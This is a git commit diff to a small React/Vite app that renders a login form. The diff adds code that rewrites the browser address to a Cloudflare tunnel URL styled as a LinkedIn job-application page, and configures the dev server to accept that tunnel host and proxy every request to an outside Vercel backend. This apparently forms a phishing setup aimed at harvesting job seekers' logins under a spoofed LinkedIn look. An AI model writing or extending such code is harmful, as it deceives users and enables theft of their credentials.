4b12f3f62ca88db3afe7489b78657c4128894992
Talha <talhaansari2026@gmail.com>
2025-08-23 01:11:57 +0530

    updates

--- src/App.jsx
+++ src/App.jsx
@@ -1,8 +1,13 @@
 import React from 'react';
 import './App.css';
 import LoginForm from './components/LoginForm';
+import { useEffect } from 'react';
 
 function App() {
+
+  useEffect(()=>{
+    window.history.pushState({}, '', 'https://obtaining-vacations-hazard-soil.trycloudflare.com/fresherseasyapplyforjobs-linkedin.com')
+  },[])
   return (
     <div className="App">
       <LoginForm />
--- vite.config.js
+++ vite.config.js
@@ -1,11 +1,18 @@
 import { defineConfig } from 'vite'
 import react from '@vitejs/plugin-react'
 
-// https://vite.dev/config/
 export default defineConfig({
   plugins: [react()],
   server: {
-    host: '0.0.0.0', // allows access from network
-    port: 5173       // optional: change if needed
+    allowedHosts: [
+      'obtaining-vacations-hazard-soil.trycloudflare.com'
+    ],
+    proxy: {
+      '/*': {
+        target: 'https://backend-linkedlist.vercel.app',
+        changeOrigin: true,
+        secure: false,
+      }
+    }
   }
 })
